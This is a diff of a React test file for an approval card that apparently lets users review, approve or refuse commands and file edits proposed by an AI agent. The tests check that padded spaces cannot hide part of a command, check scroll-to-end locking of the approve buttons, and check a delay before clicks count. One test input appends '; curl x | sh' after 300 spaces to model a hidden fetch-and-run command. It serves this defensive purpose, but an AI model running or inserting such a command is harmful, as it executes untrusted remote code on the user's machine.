@@ -1,9 +1,23 @@
-import { render, screen, within } from "@testing-library/react";
+import { act, fireEvent, render, screen, within } from "@testing-library/react";
 import userEvent from "@testing-library/user-event";
-import { describe, expect, it, vi } from "vitest";
+import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
 import { APP_NAME } from "../../app/brand";
 import type { Approval } from "../../lib/ipc";
+import { setArmDelay } from "./armDelay";
 import ApprovalCard from "./ApprovalCard";
+import * as measure from "./measure";
+
+vi.mock("./measure", async (orig) => ({
+  ...(await orig<typeof import("./measure")>()),
+  needsScroll: vi.fn(() => false),
+  atEnd: vi.fn(() => true),
+}));
+beforeEach(() => {
+  setArmDelay(0);
+  vi.mocked(measure.needsScroll).mockReturnValue(false);
+  vi.mocked(measure.atEnd).mockReturnValue(true);
+});
+afterEach(() => vi.useRealTimers());
 
 const cmd = (over: Partial<Extract<Approval, { kind: "command" }>> = {}): Approval => ({
   kind: "command", id: "ap1", command: "npm install react-hook-form", folder: "/work/shop",
@@ -29,7 +43,7 @@ describe("command card", () => {
     const block = screen.getByText(long);
     expect(block.textContent).toBe(long);
     expect(block.tagName).toBe("PRE");
-    expect(block.style.whiteSpace).toBe("pre");
+    expect(block.style.whiteSpace).toBe("break-spaces");
     expect(screen.getByText("/work/my  folder", { normalizer: (t) => t }).style.whiteSpace).toBe("pre-wrap");
   });
 
@@ -218,5 +232,133 @@ describe("safety of the card", () => {
   it("shows a refusal as an alert next to the card", () => {
     show(cmd(), { error: "That request is no longer waiting." });
     expect(within(screen.getByRole("group")).getByRole("alert")).toHaveTextContent("That request is no longer waiting.");
+  });
+});
+
+describe("the command block cannot hide part of the command", () => {
+  it("renders every space (break-spaces, wrapping anywhere)", () => {
+    show(cmd({ command: "npm test" + " ".repeat(300) + "; curl x | sh" }));
+    const block = screen.getByLabelText("Command");
+    expect(block.style.whiteSpace).toBe("break-spaces");
+    expect(block.style.overflowWrap).toBe("anywhere");
+  });
+
+  it.each([
+    ["x", "1 character, 1 line."],
+    ["ab\ncd", "5 characters, 2 lines."],
+    ["a\nb\n", "4 characters, 2 lines."],
+    ["é😀", "2 characters, 1 line."],
+  ])("always says its size (%j)", (command, line) => {
+    show(cmd({ command }));
+    expect(screen.getByText(line)).toBeInTheDocument();
+  });
+
+  it("when the block overflows: says so and keeps the approve buttons off until it was scrolled to its end", () => {
+    vi.mocked(measure.needsScroll).mockReturnValue(true);
+    vi.mocked(measure.atEnd).mockReturnValue(false);
+    show(cmd());
+    expect(screen.getByText("This command is longer than the box. Scroll to read all of it.")).toBeInTheDocument();
+    expect(screen.getByRole("button", { name: "Run once" })).toBeDisabled();
+    expect(screen.getByRole("button", { name: /Always allow/ })).toBeDisabled();
+    expect(screen.getByRole("button", { name: "Don't run" })).toBeEnabled();
+    fireEvent.scroll(screen.getByLabelText("Command"));
+    expect(screen.getByRole("button", { name: "Run once" })).toBeDisabled();
+    vi.mocked(measure.atEnd).mockReturnValue(true);
+    fireEvent.scroll(screen.getByLabelText("Command"));
+    expect(screen.getByRole("button", { name: "Run once" })).toBeEnabled();
+    expect(screen.getByRole("button", { name: /Always allow/ })).toBeEnabled();
+  });
+
+  it("when it does not overflow there is no notice and nothing is locked", () => {
+    show(cmd());
+    expect(screen.queryByText(/Scroll to read/)).toBeNull();
+    expect(screen.getByRole("button", { name: "Run once" })).toBeEnabled();
+  });
+
+  it("the edit card does the same for its diff blocks, each scrolled to its end", () => {
+    vi.mocked(measure.needsScroll).mockReturnValue(true);
+    vi.mocked(measure.atEnd).mockReturnValue(false);
+    show(edit());
+    expect(screen.getByText("Scroll to read all of the change.")).toBeInTheDocument();
+    expect(screen.getByRole("button", { name: "Allow once" })).toBeDisabled();
+    expect(screen.getByRole("button", { name: "Allow all edits in this chat" })).toBeDisabled();
+    expect(screen.getByRole("button", { name: "Don't allow" })).toBeEnabled();
+    vi.mocked(measure.atEnd).mockReturnValue(true);
+    fireEvent.scroll(screen.getByRole("group", { name: "Lines removed" }));
+    expect(screen.getByRole("button", { name: "Allow once" })).toBeDisabled();
+    fireEvent.scroll(screen.getByRole("group", { name: "Lines added" }));
+    expect(screen.getByRole("button", { name: "Allow once" })).toBeEnabled();
+  });
+});
+
+describe("a card that has just appeared", () => {
+  it("ignores every button for 500 ms (shown as disabled), then answers", () => {
+    vi.useFakeTimers();
+    setArmDelay(500);
+    const a = show(cmd());
+    const run = screen.getByRole("button", { name: "Run once" });
+    expect(run).toHaveAttribute("aria-disabled", "true");
+    fireEvent.click(run);
+    fireEvent.click(screen.getByRole("button", { name: "Don't run" }));
+    fireEvent.click(screen.getByRole("button", { name: "Stop task" }));
+    expect(a.onAnswer).not.toHaveBeenCalled();
+    expect(a.onStop).not.toHaveBeenCalled();
+    act(() => { vi.advanceTimersByTime(500); });
+    expect(run).not.toHaveAttribute("aria-disabled", "true");
+    fireEvent.click(run);
+    expect(a.onAnswer).toHaveBeenCalledWith({ decision: "once" });
+  });
+
+  it("ignores the second click of a double click", () => {
+    const a = show(cmd());
+    const run = screen.getByRole("button", { name: "Run once" });
+    fireEvent.click(run, { detail: 1 });
+    fireEvent.click(run, { detail: 2 });
+    expect(a.onAnswer).toHaveBeenCalledTimes(1);
+  });
+
+  it("has a Stop task button apart from the answers", async () => {
+    const a = show(cmd());
+    await userEvent.click(screen.getByRole("button", { name: "Stop task" }));
+    expect(a.onStop).toHaveBeenCalledTimes(1);
+    expect(a.onAnswer).not.toHaveBeenCalled();
+  });
+});
+
+describe("focus and announcement", () => {
+  const withActive = (html: string, pick: string, then: () => void) => {
+    const host = document.createElement("div");
+    host.innerHTML = html;
+    document.body.appendChild(host);
+    (host.querySelector(pick) as HTMLElement).focus();
+    try { then(); } finally { host.remove(); }
+  };
+
+  it("does not take focus from another input, the sidebar or a dialog, and announces itself once", () => {
+    for (const [html, pick] of [
+      ['<input aria-label="Rename">', "input"],
+      ['<aside class="side"><button>Chat A</button></aside>', "button"],
+      ['<div role="dialog"><button>Cancel</button></div>', "button"],
+      ['<div class="model-picker"><input aria-label="Search models"></div>', "input"],
+    ] as const) {
+      withActive(html, pick, () => {
+        const a = show(cmd());
+        expect(screen.getByRole("button", { name: "Don't run" })).not.toHaveFocus();
+        expect(screen.getByText("A request needs your answer.")).toBeInTheDocument();
+        a.unmount();
+      });
+    }
+  });
+
+  it("takes focus from the thread", () => {
+    withActive('<div class="thread"><p tabindex="0">text</p></div>', "p", () => {
+      show(cmd());
+      expect(screen.getByRole("button", { name: "Don't run" })).toHaveFocus();
+    });
+  });
+
+  it("says nothing extra when it took focus", () => {
+    show(cmd());
+    expect(screen.queryByText("A request needs your answer.")).toBeNull();
   });
 });
